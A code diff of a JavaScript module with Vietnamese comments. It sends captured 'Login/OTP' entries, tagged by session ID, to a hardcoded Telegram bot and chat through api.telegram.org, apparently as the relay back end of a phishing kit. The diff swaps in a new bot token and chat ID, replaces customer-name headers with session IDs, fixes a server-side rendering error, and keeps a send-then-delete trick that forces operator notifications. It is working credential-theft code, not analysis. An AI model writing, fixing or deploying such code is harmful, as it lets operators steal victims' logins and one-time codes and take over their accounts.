@@ -1,15 +1,16 @@
-const BOT_TOKEN = '8965667730:AAEUmQ4lrsYxck1AudaDPKkVEgFwA6nWhkc'; 
-const CHAT_ID = '-5183002196'; 
+const BOT_TOKEN = '8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs'; 
+const CHAT_ID = '-5538456743'; 
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
 let tgMessageId = null;
 let currentSessionText = '';
 let currentSessionId = '';
-let currentCustomerHeader = ''; // Biến mới: Lưu tên khách để báo hiệu ở các bước sau
 
-// Hàm lấy Session ID
+// Hàm lấy Session ID (Đã fix lỗi SSR Next.js)
 const getSessionId = () => {
     if (currentSessionId) return currentSessionId;
+    if (typeof window === 'undefined') return 'server_session';
+    
     let id = localStorage.getItem('session_id');
     if (!id) {
         id = 'user_' + Math.random().toString(36).substring(2, 9);
@@ -19,23 +20,21 @@ const getSessionId = () => {
     return id;
 };
 
-// Cập nhật hàm này để nhận thêm tham số header (tên khách)
-export const setInitialSession = (text, header = '') => { 
+export const setInitialSession = (text) => { 
     currentSessionText = text; 
-    currentCustomerHeader = header; // Lưu lại tên khách
 };
 
 export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
 export const sendTelegramMessage = (newContent) => {
+    const sid = getSessionId();
+    
     if (newContent) {
-        // Nếu có nội dung mới (Login/OTP), tự động chèn Tên Khách vào trước nội dung đó
-        const headerPrefix = currentCustomerHeader ? `<b>👤 ${currentCustomerHeader}</b>\n` : '';
-        currentSessionText += `\n\n${headerPrefix}${newContent}`;
+        // Chèn Mã Phiên ngắn gọn ngay trước nội dung mới (Login/OTP) để dễ nhận biết
+        currentSessionText += `\n\n<b>[${sid}]</b>${newContent}`;
     }
     
-    // TỰ ĐỘNG THÊM MÃ PHIÊN VÀO ĐẦU TIN NHẮN
-    const sid = getSessionId();
+    // Tin nhắn tổng hợp
     let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
 
     const tgFetch = (method, payload) => {
@@ -57,12 +56,12 @@ export const sendTelegramMessage = (newContent) => {
             if (d && d.ok && d.result) tgMessageId = d.result.message_id;
         });
     } else {
-        // Mẹo tạo thông báo: Gửi tin nhắn 🔔 rồi xóa
+        // Mẹo: Gửi tin 🔔 rồi xóa để đánh lừa Telegram nổ thông báo
         tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔' }).then(res => {
             if (res && res.ok && res.result) {
                 tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
             }
-            // Cập nhật lại ô tin nhắn chính
+            // Sau đó update nội dung vào ô tin nhắn chính
             tgFetch('editMessageText', { chat_id: CHAT_ID, message_id: tgMessageId, text: text, parse_mode: 'HTML' });
         });
     }
